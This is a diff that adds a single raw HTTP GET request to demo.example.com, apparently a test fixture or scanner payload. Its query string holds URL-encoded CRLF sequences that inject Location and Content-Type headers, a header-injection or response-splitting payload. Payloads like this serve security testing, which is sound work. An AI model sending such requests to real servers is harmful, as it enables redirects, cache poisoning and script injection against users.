@@ -1,0 +1,4 @@
+GET /a?page=h%3D%0D%0aLoCaTiOn:%0D%0aCoNtEnT-tYpE:tExT/hTmL HTTP/1.1
+Host: demo.example.com
+Connection: close
+
